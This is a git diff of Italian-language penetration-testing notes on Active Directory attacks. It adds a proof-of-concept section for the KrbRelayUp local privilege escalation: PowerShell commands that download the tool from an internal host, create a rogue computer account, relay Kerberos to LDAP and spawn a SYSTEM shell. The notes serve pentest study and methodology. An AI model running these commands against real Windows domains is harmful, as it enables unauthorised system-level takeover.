@@ -8,7 +8,7 @@ Appunti, metodologia di penetration test per il rilevamento di anomalie, elenco 
 - [Attacco 2. Enumerazione AD da non autenticato sfruttando MITM6](#Attacco-2-Enumerazione-AD-da-non-autenticato-sfruttando-MITM6-)
 - [Attacco 3. Sfruttamento ESC 8 ADCS](#Attacco-3-Sfruttamento-ESC-8-ADCS-)
 - [Attacco 4. Aggiunta nuovo computer in AD con LDAP signing not required and LDAP channel binding disabled](#Attacco-4-Aggiunta-nuovo-computer-in-AD-con-LDAP-signing-not-required-and-LDAP-channel-binding-disabled-)
-- [Attacco 5. KrbRelayUp Kerberos Relay Attack with RBCD method](#Attacco-5-KrbRelayUp-Kerberos-Relay-Attack-with-RBCD-method-)
+- [Attacco 5. Local Privilege Escalation KrbRelayUp Kerberos Relay Attack with RBCD method](#Attacco-5-Local-Privilege-Escalation-KrbRelayUp-Kerberos-Relay-Attack-with-RBCD-method-)
 ----------------
 ### Attacco 1. PetitPotam - NTLMv1 relay attack 🔐🕸🧑🏼‍💻
 
@@ -145,7 +145,7 @@ sudo python ./ntlmrelayx.py -t ldaps://IP_DC --add-computer
 ```
 
 -----------------
-### Attacco 5. KrbRelayUp Kerberos Relay Attack with RBCD method 🔓🧑🏼‍💻
+### Attacco 5. Local Privilege Escalation KrbRelayUp Kerberos Relay Attack with RBCD method 🔓🧑🏼‍💻
 
 #### Teoria
 KrbRelayUp è un wrapper che avvolge alcune delle funzionalità di Rubeus e KrbRelay (insieme ad alcuni altri strumenti) al fine di semplificare l'abuso della seguente primitiva di attacco:
@@ -160,9 +160,25 @@ KrbRelayUp è un wrapper che avvolge alcune delle funzionalità di Rubeus e KrbR
 
 ➤ Utilizzo di detto Silver Ticket (ST) per autenticarsi presso il Gestore servizi locali e creare un nuovo servizio come NT/SYSTEM (utilizzando SCMUACBypass)
 
-Essenzialmente, si tratta di un'elevazione universale dei privilegi locali non correggibile in ambienti di dominio Windows in cui la firma LDAP non è signing (impostazioni predefinite).
+Essenzialmente, **si tratta di un'elevazione universale dei privilegi locali non correggibile in ambienti di dominio Windows in cui la firma LDAP non è signing (impostazioni predefinite)**.
 
 #### Prerequisiti
 ➤ LDAP not signing (Impostazione predefinita)
 
 #### Proof of Concept
+
+➤ KrbRelayUP coercizzerà (obbligherà) un'autenticazione Kerberos dall'account della macchina locale, la trasmetterà a LDAP (AD) e creerà una primitiva di controllo sulla macchina locale usando un RBCD.
+   
+```
+PS C:\temp> wget -Uri http://192.168.1.30:8080/KrbRelayUP.exe -OutFile KrbRelayUP.exe
+PS C:\temp> KrbRelayUP.exe relay -Domain company.work -CreateNewComputerAccount -ComputerName Pentesterhost$ -ComputerPassword Welcome2022
+```
+
+➤ KrbRelayUP utilizzerà la primitiva di controllo appropriata per ottenere un ticket di servizio Kerberos e lo userà per creare un nuovo servizio in esecuzione come SYSTEM.
+
+```
+PS C:\temp>KrbRelayUp.exe spawn -m rbcd -d company.work -dc DC1.company.work -cn Pentesterhost$ -cp Welcome2022
+```
+
+➤ Completato questi passaggi una shell nt authority/system comparirà
+
